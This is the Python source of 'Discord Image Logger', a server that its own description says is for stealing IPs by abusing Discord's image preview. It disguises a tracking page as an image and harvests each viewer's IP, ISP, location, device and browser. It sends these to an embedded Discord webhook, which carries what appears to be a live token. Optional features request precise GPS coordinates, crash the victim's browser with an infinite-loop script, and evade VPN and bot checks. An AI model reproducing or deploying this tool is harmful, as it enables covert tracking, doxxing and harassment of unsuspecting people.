
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1344409790293479507/lM1xekMpADbYBG5VdQtVw3DMFb_qtw-BWu0yl6o4fO4CZp5sQ8FpJhSklTQ74ung4mfk",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3N//AABEIAJQA6wMBIgACEQEDEQH/xAAbAAADAAMBAQAAAAAAAAAAAAADBAUAAgYBB//EADoQAAIBAwIEBAUCBAUEAwAAAAECAwAEERIhBRMxQQYiUWEUIzJxgUKRM1KhwQcV0eHwJHKSsVNigv/EABoBAAIDAQEAAAAAAAAAAAAAAAECAAMEBQb/xAAhEQACAgEFAQEBAQAAAAAAAAAAAQIRAwQSITFBE1EiYf/aAAwDAQACEQMRAD8AoncVKubPmyHIzVSHcb0ZYA3Qb15BT29HRXBB/wAv0jZaXng0r0rp2hGMYqTxGLCEgY3q/FmcmHcS7SIsCSOhqtZxZbcdKTs1wSKp2f8AEp8s2MmMJFntVCGLQooMS7inIxWOU30Fzo0ceWlBlidsVSZcjpWghGobDrRhJlbdiDxMftSvwjPIdPbcn0q00XYClrrCroT/APRFaMc+QG6riHOhsjGM9aDxfh/xdjKwADFce9eiWfIkt15qrs0RPX7GqNncQ3ELNumNnV9tNWNyhJTiGZyvC+IiThsljOuHVMLq71T4b8sfDhMEDUWPc1N4/Z/CcS+IjUaCM7d6ZtJheJ8Sp5bAhMDpW6eOMsdx9K0y6kdFC16V0BT7UO8uFt7Z5W20jb3Ncem3SB6JX/EILaRY33djggHpTKxjHSuXSM3Syz3H622z2rp+HSc2whZjlgNJJ74rVqdJ8oKSJGVs1caQanXrALT9y/mIHap10Aw3rPjXNgu2BtQMFh60WVtK5NaQEInSh3L5WrJdjIjXZL3JYdBQ4s6vzTEkfm270SCDMygVa3/IbLvDVxAMjep/H3zf8Og1YDS5PvirdummJR7VCvg0/ia1jA2t0Ln810cUagjPfLLTDaglMmjnetK0UV2IQOMgZGTT8Q2qXGPnKR2qnCSBvXlsiNwVhlan3dtrWni1YVBFCEnEFkL4fkv0puzUcymZoVI3oNshEuK0OVrkayjEtHxXkK0cLWeTFZ6i5FblMpjavV6V6SAtBSa6FFd0fQVLL2alriFj0p7O23evCoO1aYzVf6G+AHC4SoYsRnNLeInaKwXlDcyDVt1p6IFW22rL+2F3ZSRYGSMjPqKsxZKyIWbbRy2bh4NEjhoidwxxj7d6y3lhtG3ZjA8iiTG5Rvt/elLm4eCWKJiSshwApxW07qPlQHUD9TBe9eglBSjSKFNod4l400XTR2VtzYsEB2ON6ntxqfilw63GY1VNogNt/wBVTbfhwRZmQsyGbQ22TG2dQI9q7e/8Lo3DrS+s087FWmXptpwcVVj0uODtLkG5kmNUMamJjIAPox5qp8Auo5bVokOyk4yd/epcQ5ZchghjfGkOCR/pR+HGK3vSQ6sHP6egNLqo7sTQydMrOuWNBmjyKd0HJyc0KVdq8+pUMiby68dBim+XmtGjpnIsRJlh+YNqbgh/6sDHQCt5EGqt7Zg1y7dsYqyMrI2UhgbVCsxzeNyXGpSCpXY+lXM56VyPBJhJ4kv+UG0Ltg9M5rqqacVRVHizqmoZretDWpOykRtl8+9PLgLSUBGc02p2rys7bNzZ61bhtqC0mK85mRUURWzeXzdK2t4ADk9aGjAtvTcRBp3dAUhmNcCvScViMMUKWQLneqoq2ByDK+RWMcikopSSaYDU+2gpm3StQx1Z7elY3StRTJkT5GGIVdWKKBt96XY+QCj9TS36BnDeIY2TiauqFXjJzt5cdjSkckapI7SM5VdWmHdhVnxtZyLF8dHIfLsyevpULgVxcWEKxwcsvJ5pV05LZ7H2r0uly/TGmjPLhjvCeKwPdyQz2otZLmYQ8wShwZQuRqGBgkY3r6LfQy3PhaS3tgRO0QUKDg+4rnuH+HLPiNmZJ4o4pGYEMNRZcH9OT5fxVFeJy2d8lm8TDU2I3PRl+9bIp1yBK+iFZ+FbqzgkkuOHQHTGUA0j5m+QW9cV5YcKaK5inEaIhJLxjpn1Fd1d3qtEUQqP+2o0vSs+pSjjYNzsHtj+1LzECjnHalZ852ry/pejF6fetWFZ0FaMaAdwtJux9qHBkMx9aMRkk1omN6fwnIwJMRtvvjauf8KqBLeSEeaSY4PtVa7ZltZTH9Wk4qXwqWGNoYImy6oXk+5rbp5vaOo3GzoAc15mgpKMCvOaK348q28mZxFrc04pyKStz5jTSsAN64MjTZrJua8TritZHGdqDz/PtTxQsnQ2v1UxGSOlJxPqbNNx0rsRMaQkJk9aWnDMaPqobnehHsJrChWmRmvIxkCt2XG9CUg8my7qM1q21Bku4YF+a6r9zUjiXiaysx9Ql/7DRhCc+kTou6wdI96a1KM+wr5tfeN5EYfBxa/ZxuKCvjbjF/8A9OtrEmvy6lyG/rWpaDNLwG+h7xt4ni+NjsbZsqrZmOMgCveGNa3ZE1u2Aevr/tUbi/ApQ/MWFlaRclgcj8nFF4Jb3NoREQpy27Dqa72n06xQ2oom7dnb2t81ony1AB9e9bF04gytdE4VwUVego3CrBbu3ViDnuTmqlrwZEcPvjpj3rRQoG3Cx5WIs2e7HOK9uGIPn61T+EWMY0VJ4q3Lesmvb+LIuzUMDWjAGhQMWBNHPSvMlykBcd6AzCjyNgUhJJ5yKeMbA5G7thTiloZCSc1jyZBoCtgEirFGkHcMyS7Y/S21SobdYL+4MXftRuIMeTEsZIlZxgUQoFZzjc96tjaRqbqFBIpfJ9qzne9JtJpIFZrpvo48FCSKFsvl1etEfKistv4deXbBRv1xWaWNjtCkkm9Lq2qQitZWwpYnAodtzXkDBDp9asiqQrVopxeUginBLp6d6SXUF3FBmuGVwB2pWrEfBaWUMg3GaBLLg0lb3Bx5utaXE2c70FCmLuLVlcB1yDv96ncd8R29gpihYPOdumQv3qBecb+FQ21udU7fqG4WuemDyllabcnJZupJrZp9Dvlun0TeN8R4hecVI5koKg7aTppWK1Jbl3GdXbOP71vbcP5jGJSVl6gnuaoWMDi7S3uSC46NXYhjjBVFAsUtbASM3NjdWT6Xxsw96f4Nw9Z+JQzJuo2ZRsQR396ekL2dwdEakFfMvrWvBJj8WrQuYV14Ktv/AEqxCtn0y3sYJ7VUmiEi4/UKXbw/ZJJrjhC+wFVLP+Au3aisQRVwotBAkKgKuAOwphTp670PJzgUN5lj/iHAoAGmCsD61yfiZik6YG1XJr+NBkOCPao3FpVu4V2GRWXWU8TTCK2TZQGnG3FS7RtOV9KdaXC9a81KLsdMyRcoaj3oaLzj6fSqnNBUjO9TOJPhMGrcS/ojEFuc5FMx5K5xUpThsmqKzARgg9KuyrgETa45cLxTON8aBXk7hcepofEGR1gbqqjJpa3uNczEDIAyfalUWa2raia8QlVAgTZ8+Y+lK/E+4pG9ujJM2DtnvS/NarXjsqySV0jsbG6blAmt535wOetQbO+Aj0mmxejGaSUQ2E5Qd1D/AE56VRRPNsMCpJuQTqzWLxXlfUNX5qlxbLItFssABSd6oDjHfel4r9ZCCxx7V7NMJHBHSgotCzaaMZ9DDftUbinFGD/DW+DIB5mHatOLcQMbiC2/iMMs2egrXgPD1vNYwSQd3Lb5rpabTbv6kZ6FIbaaYgQ24b1Jzk0c2Q0h57WUDO7Ickeu1Xo7C6sphypNUY/S21NQW9ndyONWiY7MFOAa6ZEQ54GgjiubYNcQZycdVFOM8d0qXMI0SxeZT2YelerG/DpJIXLlUOc5+paOWit5Y3gINtcjcAdD61Ag7hedLFcRDIAywBzkUGWZIpyYugYNv0okALc2HGmWNsqW/loAtsyxwuoxqDdMZBOdqKFZ9b4b8y0iyMZQbfiisNOfSl+GsI7eMeigUy+Dv1q0UA7gAY3J9KSuZSOhxnrvTFy4UZGMjsKlXTHGomg3XIBe5cZYP9OetClZVU7bYrWd1eJgT2qb8VmLSTuNt64mryvLKl4N4Htz8wkUaWk7aQbYpwg83S1YZKmSgIjZTkGpfFnZeproig05rmfEbaWAFPg/qYzXBOWUacmvRclUINIiTMZNbRDmOFz1Nb540KvxFK5nzwckYDa8V4WFnZxctcvIuWJoXGbeO3hgWM5Z2GQK14zI0csaOcfLG3pVEY88GzG9qbfZLaEs5JG53oWDTgkH9KGcZ6U/Jma9PLInSe9McwjY0nZyrGOtHmkHUHrSvljgfjMMwz3xWwmB671Jmk+acetFSQkdTVrxqgosQSgnrRrm++GgwvmkbZVqKJinfelpp2ncnbHTUT9IoYtOpz5BJjiKoLtKylzu7YySar20y21sJICVyck1PsxaKpQgs22RnrWrXY5vKZcR+grqJUqEOhhuxfR6ROSTtljRrHh5huA7SioFqIHblwMUyeo6iq0CyoCvMcoSB58HBo0AotO+sxyRhpI8ke6GlLu3VLZzE5blnKL7elbyNN8rmJhs+SQLuv3HpQri5kRoygXzMFwegNCiGkzGP4ecKcYKsw32NH4JBJIxgc5kV8qW66c7Vk7oBy9JKTr5AOimjcGWSCVmlJDImk++OlFEZ9DtHAjCg5x39ac1ZFc/wq65iIQxII7mryeYVbwITeJSBHIHWuf4jefLwp3qh4jleG8CdAUzmuVuLjJ3rm6vUO/nEKVoeh1Tt1OkDLGp09wJbhymy52p7nC04ZgMOZP19hULm6XwNsGsOFX2PNJRpFO3k0sPberty682ORTgOmfzXKpOBIBVE3hk4erjrA2k/aq8kHdiqXBdaYBDvXKeI5AzjBpiTipCkDJGK53iN607+bam02JqQXJNAg3yz96JaSBLiJjv5hSyNqXFbgYwfet82qJHuzqby35nFLVXChUHMY9sVzHHr4XfEHZSNIOBiqnH78raxyxsA0kYUVx7Sebb1qvDDdci3Jk8RUSUnG/3onNFT1mwMV58RTPGVbjyK59aO90pTaovMUHd0/eixnWMo6f+VM8PNg3pdhXbzlqftIdShsdalsGA8zAj2qvaX0EcKqclsdhS5YyS4Q0ckWAvPkg522/ep9u51HOQe4Apric63DLhScdvWkXbAbCEbDbO5rTgxuMOewt2dJw6E3Mw5IwxG+/T7VWuOGJBAktweUNOdv8AneoPhecLxIbnLIcfmun8S4m4eka+Ygdj1ArSLZFt7tCZRCqJCm2o/wCtF+KaMhll1hRq+nYfipECS6jGqMSfLp+3b711fCvDF1flHf5SHqpqAA28rTKGkiY6/wCXIJqs9qk1osq6gHwrA9R33zXRcP8AB9lDEOZmRyMEk0xxHhltaWbrEiqNOMdjvStEs5O2hUsY5182rWntTj2UgjlkkCsOXseh+2K8WIpKpIGlejUlxfjKw29zbmQCQx5U0OlbFnJLs24TxRrFJAjBgpyoP/qu64Nxi04jbo8bhZOjIeqmvkHApXkleFnB1Kdz2qnYC6trgNFeOihvp0jb896mOaYsZRmrifRPFsam1jnH1Jtn2r5ve3OmXY96+hcX5t54WZ4UMsukMNP8wr5RczuZSWQo4OCp61z9VjrLuQs80cXEijLc+Xfak3ud80FpGkUY6mlnU6hnOSM0kGkVvWYv0pLca4tY6g1S4JOJlu7c7GRMr+K5vXoOEHlIyaPZ3z2dwZY1U+XBoZFujSFWpx2Ol8g569Kk3cvnopvd9wMZ2xQZIY52LEkDVinxPb2FamCNIbjTtmmBdDHUfvQORCrHffHQGiiG3CBiHNPOmyxaqADjN3I0kccj6tKbewqVzd6q3Nukz5ZSSPU0u1khXWkf9aeEoxVCvUJiLT4rTnmnfhVBA0An0oXwyf8AxirFOJFnR6OHYBLLkg4xW/8Alg5Zk5ZGf2qio8qxnIxuRpzR5CxRdA1L21DCgfervpE0b4fpJh4UQqsdRBO+3Sn4rDz8pDjucU2wlVvIEUqvTGcf71qjSxEo537jH/r3pHkiL9sSF3tEaUq2rCdcCpt5ytZ0gnarD27yh2WXloVyxXYj71PHChcgu7su+NzgH13oRyxFepgLcPuWtp9SnBC5yO1dNwm8lv50Qgn0GOgFQv8AJpUiV8jOQQOmB71c4LJLwy3dRblnYnLK2/8AWrVlg/SfaJ0fBOG21pI11ckySudgev7V2sTCNULADI/avnP+btaQa1t2dynk3B39aQuPFF7cIyXkU6bbhMk030j+hU4v0+y215buoKSqR7GgcXsJOJW5SCVFLdCTXxRuLSBkCC5jX9IVSD+1dj4P44lqJJOIXYQYOlJHJI9z6VPog7o/p0K+FLoxqkt+i6T1jj7fmlpP8OuGTyNJdXNxKxOcasAU4/jThqDyTZ3x9J/4am8Q8eR2xJitp5h2MceaG6D9Fbg+2HT/AA64bHMstpc3EToMKM5z981B4jw6ewvGhlV9WfKW/VVi1/xFg1RrdWV3EWXLNo2X16Ul4i8VRXfELGa2gaa3gBMjSeQkk7Df2obsaXAFLHDo6zwtE0fCiJ8hmbIzXJePfDckcsvF7VAUK/MjReh/mqpa+MOHmBDJzonYfSYyQPzW3FfF3DJbWWBC9w0kbKUVSM9h/WlyShKNWV5ZQnF8ny4swH1dR22I9qzqnmHXoQc1QliUBcIMrknff7GtlXQGYYyMDScbkb1zmjl0JwR6iCiNknCnG2aFIoYeWPSNRDmqkJjihMvLLBvU5w3r+1BBeKVpB5g48wbq2PT12qDKJPkt1HkVSCd196EyOoJIwDsAe9UJDHIedyx/9B02r1JIx5ZtAAHlGentmmCkTwgMYkOcevt6Vkbc2XlqMN0BWmcrkAwoAzbAb5NbhICA2sa1O6KPxRLAUiOpbUikDoAc5oWXkVsr129KaR4YlXUCWG5YEA4oLIjaSXaMfUDiohkDeExMpKEt6Z6ClXgYORyz1/mp2IrEru2UXox6hqKJVkGtmTJ+1G6Cga7yx9tY6Dtv2rLsY+HwT8zUG39DtWVlD0BtEc26Z3JYjJr1jhiMZK58x6msrKHoDaDSiqNKsCc+aiwTOZOTsIypJGPTesrKLC+wkvm0p0XQDgetazRBYmfLFguck1lZSiSB20zamxhflAjHbNbQysHlXAOkAgkV5WURGHulCx+XyknGR13Gf70J55IzFobG2Dt12rysoC2wgZ1gWQuzN03okrMrSIrFQm4x9hWVlD0iFYpHAZwxBUAD89a9EzhRk6tQwdW//OtZWUSB2Gido1JCmMHHoRXspKrkMfq/tmsrKgX0DmYqVdcK2dyO+1aKzfFqM/Ucnv61lZUIzWZRy1P4r1R8qPzHbcGsrKgUDmAQvpA2BP8ASgCQ6EyAR3BHvWVlRDILceVsD9UYY/fNDeMMOYSdRz36da9rKcYx0VAsi/Uy53+1ZGcNoIBXfYj0r2sqBQFgc/WxycEZ2plFAUbD9hWVlBhP/9k=", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
